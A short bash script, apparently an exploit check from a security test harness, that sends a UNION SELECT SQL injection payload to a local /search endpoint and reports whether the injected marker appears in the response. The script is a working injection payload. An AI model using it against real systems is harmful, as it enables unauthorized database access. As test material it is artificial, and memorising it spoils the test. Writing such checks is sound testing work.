#!/usr/bin/env bash
BASE="http://127.0.0.1:${PORT:-5000}"
resp=$(curl -s "$BASE/search?q=x%27%20UNION%20SELECT%20%27PWNED%27,%27s%27%20--")
if echo "$resp" | grep -q "PWNED"; then echo "EXPLOITED"; exit 0
else echo "NOT_EXPLOITED"; exit 1; fi
